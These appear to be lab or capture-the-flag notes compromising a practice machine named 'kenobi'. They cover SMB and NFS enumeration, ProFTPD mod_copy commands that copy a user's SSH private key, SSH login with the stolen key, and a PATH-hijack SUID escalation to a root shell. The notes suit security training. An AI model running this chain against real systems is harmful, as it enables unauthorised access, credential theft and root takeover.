# nmap Scan 

export IP=10.10.27.67


nmap -T5 --max-retries 2500 -sC -sV -oN nmap/inital 10.10.27.67

# nmap smb scan && enum4linux

nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.27.67

`Found 3 shares`
```
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.27.67\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.27.67\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.27.67\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

```

`using enum4linux -path.pl IP`

```
======================================== 
|    Share Enumeration on 10.10.27.67    |
 ======================================== 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      
	IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

```

# Login with anon

`$smbclient //$IP/anonymous`

# get files

`smbget -R smb://$IP/anonymous`


# Shows Mount
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.27.67

# get version of proftpd

` With nc -> nc $IP 21 (port)`

# Using searchploit with the software version

`searchsploit ProFTPD 1.3.5` -> searchsploit -x linux/remote/36803.py // Inspect

SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa

sudo apt-get install nfs-common --for mounting
sudo service portmap status



# file cmd
* sudo mount 10.10.81.58:/var nfs
* sudo cp id_rsa ../.. -- get id_rsa
* sudo umount nfs
* sudo chmod 600 id_rsa
* sudo ssh -i id_rsa kenobi@10.10.81.58

# Search for SUID's fot priv esc
* find / -perm -u=s -type f 2>/dev/null  --- Show all suid find the odds elpoit
* found /usr/bin/menu
* ```export PATH=/home/kenobi/:$PATH```  --- add to path for script exec
* echo "/bin/bash -p" > curl    --- copy bin bash to curl sample
* chmod +x curl --- own
* curl
* /usr/bin/menu --- execute and get shell
*
This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).
*
As this file runs as the root users privileges, we can manipulate our path gain a root shell.
*
We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell 